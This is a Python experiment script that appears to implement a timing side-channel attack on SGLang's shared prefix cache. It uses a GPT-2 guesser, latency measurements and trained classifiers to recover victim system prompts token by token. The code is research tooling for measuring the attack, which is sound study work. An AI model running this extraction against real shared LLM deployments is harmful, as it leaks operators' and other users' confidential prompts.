import torch
import torch.nn.functional as F
from datasets import load_dataset
from transformers import GPT2LMHeadModel, GPT2Tokenizer
import argparse
import random
import re

import numpy as np
import time
from tqdm import tqdm, trange
import sglang as sgl

import joblib

from english_words import get_english_words_set

import requests

token_count = [3] #[3, 4, 5, 6, 7]

import keyword


# TODO:
# DOWNLOAD THE MODEL FIRST, PLEASE CHANGE IT TO THE MODEL PATH
# ===============================================================
model_name = "Eidos777/sysprompt_judge_v0.001"

classifier = 'data/voting_model_prefix_.pkl'
scaler_filename = 'data/scaler_prefix_.pkl'
selector_filename = 'data/selector_prefix_.pkl'
threshold_filename = 'data/best_threshold_prefix_.pkl'


predictor_device = torch.device('cuda:1')

model_a = GPT2LMHeadModel.from_pretrained(model_name)
tokenizer = GPT2Tokenizer.from_pretrained(model_name)

# print(f'model_a.device: {model_a.device}')
# model_a = model_a.to(predictor_device)
# tokenizer = tokenizer.to(predictor_device)

# print(model.device)
# print(tokenizer.device)

words = get_english_words_set(['web2'], lower=True)

pred = []

filtered_words = [word for word in words if 2 <= len(word) <= 6]


# predict next token of the prompt for at most num cases.
def next_token_gpt(prompt):
    # Encode input text
    model_a = GPT2LMHeadModel.from_pretrained(model_name)
    tokenizer = GPT2Tokenizer.from_pretrained(model_name)

    input_ids = tokenizer.encode(prompt, return_tensors='pt')
    input_ids.to(predictor_device)

    print(f'input_ids: {input_ids.device}')
    # Get model outputs
    outputs = model_a(input_ids)
    # print(f'outputs: {outputs.device}')
    # outputs = outputs.to('cpu')
    next_token_logits = outputs.logits[:, -1, :]

    # Convert logits to probabilities
    next_token_probs = F.softmax(next_token_logits, dim=-1)

    all_token_ids = torch.arange(next_token_probs.size(-1))
    
    all_token_probs = next_token_probs.squeeze().tolist()

    all_tokens = [tokenizer.decode([token_id]) for token_id in all_token_ids]
    
    return all_token_probs, all_tokens

# the history here is a dictionary that store the current prefix test history on the miss time.
def temperature_scaling(all_token_probs, temper, last_miss):
    # last time
    #print(f'what is :{last_miss}')
    #print("ok")
    if last_miss != -1:
        all_token_probs[last_miss] /= 2.0
    
    # Convert to logits
    logits = np.log(all_token_probs)
    
    # Apply temperature scaling
    scaled_logits = logits / temper
    
    # Convert back to probabilities
    scaled_probs = np.exp(scaled_logits)
    
    # Normalize to ensure the sum is 1
    scaled_probs /= np.sum(scaled_probs)

    return scaled_probs

def selected(scaled_probs):
    options = np.arange(len(scaled_probs))

    choice = np.random.choice(options, p=scaled_probs)

    return choice

@sgl.function
def few_shot_mmlu(s, question):
    s += question + sgl.gen("answer", temperature=0, max_tokens=1)

# For different prefix token length, we choose different classifier.
# return the result with FP, FN, TP times in test_time.
def test_ok(victim, prefix, all_tokens, all_token_probs, temper, test_time, oracle, token_count):
    # result: FP FN TP test_time
    result = [0, 0, 0, 0]
    last_time = -1
    scaled_probs = all_token_probs
    count = 0
    warmup_word = random.choice(filtered_words)
    for n in range(test_time):
        count += 1
        
        
        last_time = select_next(scaled_probs, temper, last_time)
        print(f'last_time: {last_time}')
        
        judge_list = []
        time_list = []
        time.sleep(0.1)
        test_prefix = prefix + all_tokens[last_time] + " " + warmup_word
        print(f'victim: {victim}')
        print(f'test_prefix: {test_prefix}')

        for _ in tqdm(range(100), "Processing:"):
            # input the sentence here first
            torch.cuda.synchronize()
            states = few_shot_mmlu.run(question=victim)
            states["answer"].strip()
            torch.cuda.synchronize()

            tic = time.perf_counter()
            states = few_shot_mmlu.run(question=test_prefix)
            states["answer"].strip()
            torch.cuda.synchronize()
            tictok = time.perf_counter()
            
            latency = tictok - tic
            
            flush_cache()
            time_list.append(latency)
            time.sleep(0.1)
        
        for i in range(len(time_list)):
            new_data = np.array(time_list[i]).reshape(1,-1)

            label = predict_new_data(new_data, classifier, scaler_filename, selector_filename, threshold_filename, token_count)

            judge_list.append(label)
        
        # torch.cuda.synchronize()
        
        value = sum(judge_list)
        print(f'value: {value} ')
        
        if value >= 0.5 * len(judge_list):
            # FP
            if all_tokens[last_time] != oracle:
                # result: FP FN TP test_time
                result[0] += 1
                result[3] = count
                print('############## FP ############')
                return result
            # TP
            else:
                result[2] += 1
                result[3] = count
                print('############## TP ############')
                return result
            #return count, True
        else:
            if all_tokens[last_time] == oracle:
                # print(f'false negative: {new_data}')
                print('############## FN ############')
                result[1] += 1

    result[3] = test_time
    # Failed to find the result in 'test_time' attempts.
    return result

# For different prefix token length, we choose different classifier.
def select_next(all_token_probs, temper, last_time):
    scaled_probs = all_token_probs
    scaled_probs = temperature_scaling(all_token_probs, temper, last_time)
    
    # CHANGE THE ORACLE JUDGE WITH YOUR CLASSIFIER
    # =====================================================
    choice = selected(scaled_probs)
    
    # choice will act as last_time if this is judged as false
    return choice


def process_string(input_str):
    pattern = r'\s*\w+|\s*[,.]'
    
    result_list = re.findall(pattern, input_str)
    
    return result_list

# def oracle_judge(thres):
#     if random.uniform(0, 1) > thres:
#         return True
#     else:
#         return False

def predict_new_data(new_data, model_filename, scaler_filename, selector_filename, threshold_filename, token_count):
    #print("Loading model, scaler, selector, and threshold")
    # model_filename = model_filename[:-4] + str(token_count) + model_filename[-4:]
    # scaler_filename = scaler_filename[:-4] + str(token_count) + scaler_filename[-4:]
    # selector_filename = selector_filename[:-4] + str(token_count) + selector_filename[-4:]
    # threshold_filename = threshold_filename[:-4] + str(token_count) + threshold_filename[-4:]

    model_filename = f'data/voting_model_prefix_{token_count}_random1.pkl'
    scaler_filename = f'data/scaler_prefix_{token_count}_random1.pkl'
    selector_filename = f'data/selector_prefix_{token_count}_random1.pkl'
    threshold_filename = f'.data/best_threshold_prefix_{token_count}_random1.pkl'

    model = joblib.load(model_filename)
    scaler = joblib.load(scaler_filename)
    selector = joblib.load(selector_filename)
    best_threshold = joblib.load(threshold_filename)
    # best_threshold = 0.85 #!!!!!!!!!!!!!!!
    #print(f'Best threshold: {best_threshold}')
    #print("Preprocessing new data")
    new_data_scaled = scaler.transform(new_data)
    new_data_selected = selector.transform(new_data_scaled)

    #print("Making predictions")
    probabilities = model.predict_proba(new_data_selected)[:, 1]
    # print(f'prob: {probabilities}')
    predictions = (probabilities >= best_threshold).astype(int)

    return predictions # , probabilities

# flush the cache of sglang.
def flush_cache():
    Response = requests.get("http://localhost:10005/flush_cache")
    #print(Response)

def warmup(prefix, all_tokens):
    warmup = []
    while len(warmup) < 20:
        warmup_word = random.choice(filtered_words)
        if warmup_word not in all_tokens and warmup_word not in warmup:
            warmup.append(warmup_word)
    
    for i in range(len(warmup)):
        #flush_cache()
        warmup_question = prefix + ' ' + warmup[i]
        # print(warmup_question)
        # start_time = time.time()
        initial_states = few_shot_mmlu.run(question=warmup_question)
        pred.append(initial_states["answer"].strip())
        # end_time = time.time()
        # print(f'warmup latency: {end_time - start_time}')
    
# Some basic value and settings.

# all of the parameters will be treated as hyper parameters.

# assume only if the random value selected is higher than the thres,
# can the oracle made the result right

ds = load_dataset("teilomillet/system_prompt")

mylist = ds['train']['prompt']

# thres: changed from 0.1 - 0.3
# first assume we have 500 chances to select.
# change the temperature from 2.0 - 20.0 - 200.0


thres = 0.1
# at least, temperature 0.5 & 1.0 has relatively good results.
tempers = [0.5]
test_time = 100
fw = open('first_token_recover.txt', 'w')


# SET UP THE SGL.
sgl.set_default_backend(sgl.RuntimeEndpoint("http://localhost:10005"))

# warming up
# Test For 10.

# Test whole for the list, do it once at first.
# 0.5 - 1.0 are relative good temperature
for d in tqdm(range(1)):

    for k in tqdm(range(len(mylist)), desc='requests:'):
        victim = mylist[k]
        victim_token = process_string(victim)

        # print(f'victim token: {victim_token}')
        start = victim_token[0] + victim_token[1] + victim_token[2]
        startlen = 3

        if victim_token[3] != ' teacher':
            continue
        # FIRST STEP: INITIALIZE THE SGLANG
        # ==================================
        # USE THE VICTIM TO INITIALIZE THE SGLANG
        
        print(f'-----{k}------:')
        # Do as much as you can
        for count in token_count:
            # First select the next_token
            all_token_probs, all_tokens = next_token_gpt(start)
            time.sleep(1)
            print(f'oracle: {victim_token[startlen]}')
            # test the next token.
            result = test_ok(victim, start, all_tokens, all_token_probs, tempers[0], test_time, victim_token[startlen], count)
            
            fw.write(f'{k}:{result}\n')

            if result[2] == 1:
                start += victim_token[startlen]
                startlen += 1
            else:
                fw.write(f'{k}: end here.\n')
                

    # print(f'result: {result}')
